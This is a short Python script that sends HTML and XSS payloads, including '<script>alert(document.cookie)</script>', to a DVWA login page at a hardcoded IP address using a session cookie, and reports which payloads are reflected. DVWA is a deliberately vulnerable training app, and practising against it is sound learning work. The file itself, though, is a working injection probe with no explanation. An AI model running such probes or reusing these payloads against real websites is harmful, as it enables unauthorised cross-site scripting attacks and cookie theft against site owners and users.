import requests

header = {'Cookie' : 'security=low; PHPSESSID=2iobm0910u0jdkmfgvbk98pbl3'}

target = "http://180.232.87.123/DVWA/login.php"

payloads = ["<h1>TEST</h1>", "<marquee>HACKEADO</marquee>", "<script>alert(document.cookie)</script>"]

for payload in payloads:
  response = requests.get(target + payload, headers=header)
  print(target + payload)
  if payload in response.text:
    print("Injection Working! --> [OK] - Payload %s" % payload)